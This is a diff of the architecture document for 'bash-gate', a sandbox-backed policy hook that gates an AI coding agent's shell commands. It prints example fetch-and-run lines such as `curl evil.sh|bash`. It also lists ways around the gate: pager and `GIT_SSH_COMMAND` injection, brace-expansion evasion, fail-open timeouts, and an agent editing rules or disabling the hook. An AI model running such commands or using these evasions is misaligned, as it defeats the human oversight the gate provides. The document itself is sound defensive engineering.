@@ -1,205 +1,117 @@
-# bash-gate architecture
+# Architecture
 
-The design of `bash-gate` as a set of distinct decisions and their implications.
-For *how* commands are evaluated see [`EVALUATION.md`](EVALUATION.md); for the
-rule DSL see [`RULES.md`](RULES.md); for the Claude Code wire contract see
-[`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md).
+`bash-gate` is a static policy layer around Claude Code's Bash tool. The
+[evaluation pipeline](EVALUATION.md), [rules reference](RULES.md), and
+[hook protocol](CLAUDE_CODE_HOOKS.md) define behavior; this document explains
+the constraints behind it.
 
----
+## Assumptions
 
-## Foundational assumptions
+The design depends on two deployment properties:
 
-### Operating context
+- The agent runs inside an OS sandbox, normally `nono`. The sandbox protects the
+  engine, global rules, and attestations from writes while limiting filesystem
+  and network reach. `bash-gate` supplements that boundary; it does not replace
+  it. `sandbox nono` checks `NONO_CAP_FILE` to prevent accidental unconfined use.
+- Known-safe commands should run without prompts, known-dangerous commands
+  should stop, and unfamiliar but statically valid commands should retain a
+  human backstop. This produces the `allow`/`deny`/`ask` outcome model.
 
-Two properties of the deployment the whole gate exists to serve:
+The Bash integration also assumes that shell state does not persist between tool
+calls and that hook input `cwd` is the command's actual working directory. The
+first makes rejecting assignments and functions practical; the second makes
+relative resolution and redirect containment meaningful. These controls must be
+revisited if either behavior changes.
 
-- **The agent (Claude / the Agent Harness) runs inside a sandbox.** The gate is
-  a second, complementary layer, not the only wall: it assumes the harness is
-  already confined by a sandbox (in practice `nono`) that bounds filesystem and
-  network reach. This is what lets several decisions stand as written — the gate
-  ships its engine and rules read-only *because* `~/.claude` is writable from
-  inside that sandbox (**Install location**); self-protection of the gate's own
-  files is delegated to the sandbox profile (**Self-protection**); the
-  **Sandbox gate** actively refuses to run unless that sandbox is present
-  (`NONO_CAP_FILE`), so a rule set can never silently execute unconfined; and
-  redirect containment exists precisely because a write like
-  `> ~/.claude/settings.json` is *sandbox-permitted* and therefore still needs
-  bounding here (**Redirects**). Remove the sandbox and these are no longer
-  sufficient: the agent could edit the rules, disable the hook, or reach files
-  the containment logic assumed were unreachable.
-- **The user wants safety without approving every call.** The point of the gate
-  is to remove the human from the common path while keeping a backstop for the
-  uncommon one. This is the whole justification for the **outcome model**:
-  known-good commands `allow` silently, known-bad `deny`, and only the genuinely
-  *unmatched* fall through to `ask`. A design that denied everything unknown, or
-  prompted on everything, would satisfy "safe" but violate this assumption; one
-  that allowed everything unknown would satisfy "no prompts" but violate safety.
-  The allowlist-with-`ask`-fallthrough is the specific shape that honours both,
-  and `automode` is the variant that hands the fallthrough to Claude Code's
-  classifier when even fewer prompts are wanted.
+## Design choices
 
-If the sandbox assumption fails, the containment, install-location, and
-self-protection decisions must be revisited; if the low-friction assumption
-fails, the outcome model's `ask` fallthrough is the wrong default.
+| Area                   | Choice                                                                             | Consequence                                                                        |
+| ---------------------- | ---------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
+| Failure model          | Refuse anything not statically verified                                            | Parse, config, trust, and wrapper failures deny                                    |
+| Outcomes               | deny match → `deny`; allow match → `allow`; unmatched → `ask`                      | Common safe operations avoid prompts without silently accepting unknown commands   |
+| Parser                 | `mvdan.cc/sh/v3/syntax`                                                            | Native Go AST, one dependency, no runtime bridge                                   |
+| Matching               | argv tokens with one linear `ANY` or `HAS` construct                               | Avoids unsafe command-string globbing and backtracking                             |
+| Dynamic shell features | Inspect substitutions; reject variables, arithmetic, assignments, and functions    | Unknown runtime values cannot bypass matching                                      |
+| Executable trust       | Search inherited `PATH`, then require a configured trusted directory               | Models the binary Bash would choose while rejecting user-writable shadows          |
+| Canonical paths        | Do not use `realpath`                                                              | Policies refer to stable lookup paths rather than versioned symlink targets        |
+| Redirects              | Contain writes; deny writes when `cd` appears                                      | Prevents policy-approved commands from writing arbitrary sandbox-visible files     |
+| Policy tiers           | Required global tier plus optional cwd project tier                                | Repositories can add policy, but a global deny remains absolute                    |
+| Loosening controls     | `trust`, `sandbox`, and `returntype` are global-only                               | A project cannot alter the execution boundary or output mode                       |
+| Project integrity      | Hash normalized tiers and verify a read-only attestation store                     | Workspace edits fail closed until approved by an operator                          |
+| Installation           | Engine, rules, and attestations below `$HOME/.bash-gate`, read-only in the sandbox | Writable Claude configuration cannot replace the gate                              |
+| Hook failures          | Exit 2 for denial; wrapper converts malformed outcomes to exit 2                   | Crashes and invalid output do not silently permit execution                        |
+| Automode               | Defer only unmatched results                                                       | Explicit allow and deny policy remains authoritative                               |
+| Logging                | Require a writable log directory before evaluation                                 | Every attempted hook decision has a log destination, though logs remain tamperable |
 
-### Bash tool mechanics
+Self-protection belongs to the sandbox profile, not to Bash policy.
+[`conf/nono-profile.example.json`](../conf/nono-profile.example.json) documents
+the intended grants, and `bash-gate selfcheck` probes their effective syscall
+behavior from inside the sandbox.
 
-Two properties of the Claude Code Bash tool the containment and assignment logic
-rest on:
+## Parser choice
 
-- **Shell state does not persist across calls.** Env vars, functions, and
-  aliases are re-initialised from the user's profile on every Bash call. This is
-  what lets the gate refuse assignments and function declarations outright
-  without breaking multi-step workflows — there is no "set it once, use it
-  later" to preserve.
-- **The hook reports the invocation's working directory as `cwd`.** The gate
-  reads that field from the per-call hook JSON and never inspects its own process
-  working directory, so it does not matter whether the Bash tool's working
-  directory persists across calls (e.g. `CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR`
-  resets it every call). Whatever directory the command actually runs in is the
-  one reported, which makes `cwd` a trustworthy containment base for redirect and
-  `./` resolution.
+Shell source cannot be split safely with strings or regular expressions:
+operators inside quotes differ from actual pipelines, and nested substitutions
+hide executable commands. `mvdan.cc/sh/v3/syntax` provides a current Bash AST,
+handles constructs such as `[[ ]]` and arithmetic syntax, and avoids the runtime
+and bridge overhead of Node, Python, or WASM alternatives. Direct AST traversal
+also keeps extraction explicit and testable.
 
-If either mechanic ever changes, the containment and assignment-denial designs
-must be revisited.
+## Attestation boundary
 
----
+Project policy is workspace-writable and can add allows, so deny precedence
+alone is insufficient. Attestation records the normalized contents reviewed by
+an operator. On every sandboxed load, the gate verifies tier hashes, the global
+trusted-`PATH` snapshot, and that the record store cannot be overwritten,
+extended, or replaced through its parent. Unknown record schema versions fail
+closed.
 
-## Design decisions
-
-Each decision, the choice made, and what it commits us to.
-
-| Decision              | Choice                                                                                          | Implication                                                                                                       |
-| --------------------- | ----------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
-| **Threat model**      | Adversarial (prompt injection)                                                                  | Achieved by **refusing** unresolvable constructs, never by evaluating them. Fail-closed is non-negotiable.       |
-| **Outcome model**     | denylist → `deny`; allowlist → `allow`; **unmatched → `ask`**; unresolvable → `deny`            | Hard-denying everything unknown just punishes the operator; `ask` preserves a human backstop for novel commands. |
-| **Parser**            | `mvdan.cc/sh/v3/syntax`, native Go                                                               | One dependency, no runtime deps, sub-5 ms parse. See [Why this parser](#why-this-parser).                         |
-| **Path resolution**   | Inherited `PATH` + configured trust dirs; **no `realpath`**                                      | The gate resolves what bash will actually run; realpaths are version-pinned and break on upgrade.                |
-| **Trust source**      | `trust` directives, never compiled in                                                           | Portable — no baked platform paths. The binary ships zero hardcoded filesystem paths.                            |
-| **Match syntax**      | argv tokens, not string globs                                                                    | `git -c core.pager=sh status` defeats a glob but fails token matching.                                            |
-| **`ANY` / `HAS`**     | `ANY` = 0-n tokens, one per rule; `HAS` = exactly one token, any position                        | Keeps matching linear with no backtracking; the matcher stays a pure, trivially-testable function.               |
-| **Assignments**       | Deny any assignment prefix or bare assignment                                                    | `GIT_SSH_COMMAND=…` is execution through an allowed argv and is unreachable by `HAS`. Costs some usability.       |
-| **Hidden words**      | Recurse `CmdSubst`/`ProcSubst`; deny `ParamExp`/`ArithmExp`/`FuncDecl`                            | Substitution *contents* are statically visible and checkable; parameter *values* are not, so they must deny.     |
-| **Redirects**         | Containment on writes; deny all writes when `cd` is present                                       | `> ~/.claude/settings.json` is sandbox-permitted, so writes need bounding; `cd` moves the containment base.       |
-| **Two-tier scope**    | Global binary + rules; project tier may add                                                     | An allowlist is inherently two-tier: machine policy plus per-repo additions.                                     |
-| **Tier precedence**   | Global `deny` absolute; project `allow` may widen `ask`→`allow` but never overrides a global deny | The project file is repo-editable, so it can tighten freely but can never loosen a global deny.                  |
-| **Loosening lives global** | `trust` / `sandbox` / `returntype` are global-tier only                                    | Anything that can *widen* policy is kept out of the attacker-editable project tier; ignored + logged there.       |
-| **Config format**     | Line-oriented, inert DSL                                                                         | The project tier is attacker-editable, so config is matched, **never executed**.                                 |
-| **Sandbox gate**      | `sandbox nono` requires `NONO_CAP_FILE`; directive global-only                                    | Refuses to run outside its intended sandbox unless explicitly, globally opted out via `dangerously-none`.        |
-| **Install location**  | `$HOME/.bash-gate/`, engine + rules read-only                                            | `~/.claude` is writable from inside the sandbox; the gate must live where the agent cannot disable it. Deployment example: [`conf/nono-profile.example.json`](../conf/nono-profile.example.json) (`.sandbox/` is the dev profile for building `bash-gate` itself). Nothing enforces this shape is actually delivered except the nono profile — `bash-gate selfcheck` (run inside the sandbox) probes it. |
-| **Failure handling**  | Deny with reason; log all; deny on bad exit **or** empty/non-JSON output                          | "A control that fails open when it crashes is one segfault from absent." See [`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md#exit-codes). |
-| **Deny signalling**   | `bash-gate` exits **2** (+ deny JSON) on deny, 0 otherwise; `gate.sh` propagates and forces exit 2 on any crash | Exit 2 is Claude Code's native blocking channel and needs no JSON parsing, so deny stays fail-closed even if the body is dropped. |
-| **Return-type modes** | `decision` (default) vs `automode`; automode emits denials and explicit allows, defers only the unmatched fallthrough | Lets the allowlist act as a pre-filter in front of the auto-mode classifier instead of owning every decision.    |
-| **Self-protection**   | Out of scope — Bash gating only                                                                  | Protecting the gate's own files is the nono profile's job, not the hook's. See [`conf/nono-profile.example.json`](../conf/nono-profile.example.json) and the README's "Example sandbox profile" and "Self-check" (`bash-gate selfcheck`) sections. |
-
----
-
-## Why this parser
-
-Command extraction needs a real shell parser — string/regex splitting gets
-`git commit -m "fix && cleanup"` wrong, and `bash --pretty-print` / `bash -n`
-re-emit source rather than structure (`\g\i\t` and `$(curl evil.sh)` survive
-verbatim; `bash -n` happily accepts `git status && $(curl evil.sh|bash)`).
-
-Among real parsers, `mvdan.cc/sh/v3/syntax` (native Go) wins on every axis that
-matters here: ~4.6 ms parse vs ~59–74 ms for the Node/Python bridges, **no**
-runtime dependency, a current grammar that handles `[[ ]]` and `$(())`, and a
-usable AST. The npm `mvdan-sh` and WASM `sh-syntax` packages are downstream
-bridges to the same Go library — using it directly removes the middleman.
-`bashlex` (Python) fails outright on `[[ -f x ]]` and `$((1+2))`.
-
----
+In hook mode, the installation root comes from the password database rather
+than `$HOME` or `$BASH_GATE_DIR`, preventing an agent-controlled environment
+from selecting forged rules. Operator commands continue to honor those
+variables. `dangerously-none` skips attestation because an unconfined process
+that can edit both policy and records makes verification meaningless.
 
 ## Residual risks
 
-Stated, not solved. These are the known edges of a fail-closed static gate:
+- Allowlisting an interpreter such as `bash`, `python`, or `node` can grant
+  arbitrary execution through its evaluation flags. This is a policy error, not
+  something argv matching can repair.
+- `HAS` blocks only listed flags. Dangerous alternatives remain possible until
+  policy authors enumerate them.
+- Matching occurs before glob, brace, and tilde expansion. Runtime-expanded
+  arguments may differ from the literal tokens the policy inspected.
+- Project attestation detects changes but does not prevent them. It trusts the
+  sandbox to keep the attestation store read-only and requires one approval per
+  machine for every present project tier.
+- `automode` delegates unmatched commands to Claude Code's classifier, so its
+  treatment of unknown commands replaces the guaranteed prompt.
+- Rejecting assignments and dynamic argv blocks legitimate forms such as
+  `FOO=1 make` and `git commit -m "$MSG"`.
+- Claude Code hook timeouts fail open because the wrapper cannot handle them.
+- Decision logs are writable in the sandbox and are not evidence-grade.
+- `GATE_DEBUG` records raw, attacker-controlled input and may expose argv
+  secrets.
 
-- **Allowlisted interpreters reopen everything.** Allowing `python`, `node`, or
-  `bash` grants arbitrary execution via `-c`/`-e`. Closed today only because they
-  are absent from the allowlist — adding one is a policy mistake, not a bug.
-- **Flag coverage is a blocklist.** `HAS` catches only the flags you enumerate.
-  Anything dangerous but un-enumerated slips through.
-- **Matching is pre-expansion.** Glob, brace, and tilde expansion happen at
-  runtime, after matching. `rm {a,b}` and `--ext-dif?` are literal tokens to the
-  parser, so `HAS` rules and any path-shaped matching can be evaded.
-- **The project tier is agent-editable — detected via attestation, not
-  enforced.** It can never override a global `deny`, but it is not purely
-  tightening: a project `allow` can widen an unmatched (`ask`) command to
-  `allow`, bypassing the prompt. A hostile diff can also add confusing
-  denials. `bash-gate attest` records a human-approved hash of each tier
-  (`RULES.md §10`); `loadConfig` recomputes it on every load and denies
-  everything on any divergence, so neither in-session tampering nor a
-  hostile-shipped `.bash-gate` takes effect until attested on this
-  machine. The trust anchor is that the attestation store is read-only inside
-  the sandbox. `verifyAttestation` probes the store for writability before
-  reading any record — if any write succeeds (overwrite, create, or
-  parent-rename) it denies everything, so a misconfigured sandbox profile that
-  leaves `attestations/` writable is caught at the gate, not discovered after
-  the fact. In hook mode the install root is resolved via `getpwuid` (the
-  password database) rather than `$BASH_GATE_DIR` or `$HOME`, so the
-  agent cannot redirect the gate to a pre-forged rule store by manipulating
-  environment variables; operator commands (`validate`, `attest`, `test`,
-  `selfcheck`) still honour the env vars.
-- **Under `sandbox dangerously-none` attestation is skipped entirely!**
-  Without a sandbox the agent can rewrite both rules and records, so checking
-  hashes adds latency for zero security value.
-  Those the name `dangerously-none` is a deliberate warning: it is only safe
-  to use in a trusted environment where the agent cannot be tricked into running
-  unconfined.
-- **`automode` delegates the unmatched (`ask`) fallthrough** to Claude Code's
-  classifier, so under it unknown commands no longer hit a guaranteed `ask`.
-  Explicit `deny` and `allow` rules are still honoured. The human backstop for
-  the unknown is only as strong as that classifier.
-- **Assignment/`ParamExp` denial has a usability cost.** `git commit -m "$MSG"`
-  and `FOO=1 make` are denied. Expect friction here first.
-- **Hook timeout fails open**, and **logs are tamperable** from inside the
-  sandbox — see [`CLAUDE_CODE_HOOKS.md`](CLAUDE_CODE_HOOKS.md#gatesh--fail-open-mitigation).
-- **`GATE_DEBUG` stdin capture is sensitive** — it mirrors attacker-controlled
-  command text and any argv secrets to `stdin.log`. Debug-only; keep it unset.
+## Environment-specific policy
 
-### Kill switch
+The binary contains no trusted directories. Starter rules must reflect the live
+machine: user-writable directories early in `PATH` can shadow system tools,
+world-writable locations must not be trusted, and package-manager shims may
+resolve outside their apparent bin directory. Global attestation records the
+trusted subset of `PATH` in order so such resolution changes fail closed.
 
-If the gate misfires, the rules directory is read-only from inside the sandbox
-and load failure denies everything, so recovery must happen from **outside** the
-sandbox: remove the `PreToolUse` entry from `~/.claude/settings.json`, or point
-`BASH_GATE_DIR` at a directory containing a permissive `global/rules`.
+## Validation
 
----
+`bash-gate validate` is an operator-only linter, separate from hook evaluation.
+It reuses the runtime line parser but continues after errors to report all of
+them. Its semantic warnings are deliberately conservative: duplicates, ignored
+project directives, absent trust directories, rules for unconditional-deny or
+safe-builtin commands, and allow rules provably covered by a deny. Uncertain
+shadowing is not reported.
 
-## Environment assumptions
+## Recovery
 
-Machine-specific findings that drive the *starter* trust list, not the binary
-(which bakes in nothing):
-
-- **Several user-writable directories precede `/opt/homebrew/bin` in the live
-  `PATH`** (`~/.bun/bin`, `~/.go/bin`, sandbox helper dirs, …). Anything dropped
-  there shadows the real binary — which is exactly why resolution runs the
-  inherited-`PATH` lookup and *then* applies the trusted-dir check, rather than
-  trusting `PATH` order.
-- **`/usr/local/bin` is world-writable** on this machine and is deliberately
-  excluded from the starter trust list.
-- Coreutils shims mean `ls` resolves to
-  `/opt/homebrew/opt/coreutils/libexec/gnubin/ls`, not `/opt/homebrew/bin`; trust
-  dirs must cover the shim path. This is also why `which`-style (stable) paths
-  are trusted rather than `realpath` (version-pinned) ones.
-
----
-
-## The `validate` linter
-
-`bash-gate validate` lints rule files **before** they are installed and is
-entirely outside the evaluation pipeline — no stdin, no sandbox gate, no logging,
-no permission decision (usage in [`README.md`](../README.md#validate)).
-
-Two design points worth stating:
-
-- **It reports every error, not the first.** The runtime loader is fail-closed:
-  the first malformed line collapses the config to deny-all, which is useless for
-  editing. `validate` shares the loader's exact per-line verdict (`parseLine`,
-  extracted from `parseTier`) but *continues* past errors so all of them surface
-  with line numbers. Same parser, opposite stopping rule.
-- **Semantic warnings are sound, never speculative.** Dead rules (unconditionally
-  denied or safe-builtin commands), shadowed allows (only when a deny provably
-  covers every command the allow could match), ignored project-tier directives,
-  missing trust dirs, and duplicates are warnings — they never change the exit
-  code alone, and the shadow check stays silent on any case it cannot prove.
+Because the sandbox cannot repair read-only policy and a load error denies all
+commands, recovery occurs outside it: remove the `PreToolUse` registration or
+replace the global policy through trusted operator access.
